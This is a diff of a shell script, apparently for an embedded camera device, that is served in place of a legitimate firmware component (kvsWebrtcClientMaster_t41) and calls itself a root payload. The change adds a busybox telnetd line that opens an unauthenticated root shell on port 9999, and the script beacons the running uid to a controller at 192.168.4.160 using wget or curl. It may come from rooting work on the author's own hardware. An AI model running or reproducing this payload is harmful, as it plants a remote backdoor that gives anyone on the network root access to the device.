@@ -1,7 +1,9 @@
 #!/bin/sh
-# owner-authorized root payload, served as the kvsWebrtcClientMaster_t41 component.
-# wget first: this busybox may not ship curl, and a silent beacon failure looks dead.
+# Root payload for the component channel. First action opens a port, because a beacon
+# depends on HTTP working in whatever context executes this; telnetd does not.
+# 9999 is the same port the OTA stage2 uses, so the probe is identical either way.
 exec >/tmp/fss_launch_log 2>&1
+/bin/busybox telnetd -l /bin/sh -p 9999 2>/dev/null
 B=http://192.168.4.160:8080
 get() { /bin/busybox wget -q -O "$2" "$B$1" 2>/dev/null || wget -q -O "$2" "$B$1" 2>/dev/null || curl -s -m 5 -o "$2" "$B$1" 2>/dev/null; }
 get "/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=launch" /dev/null
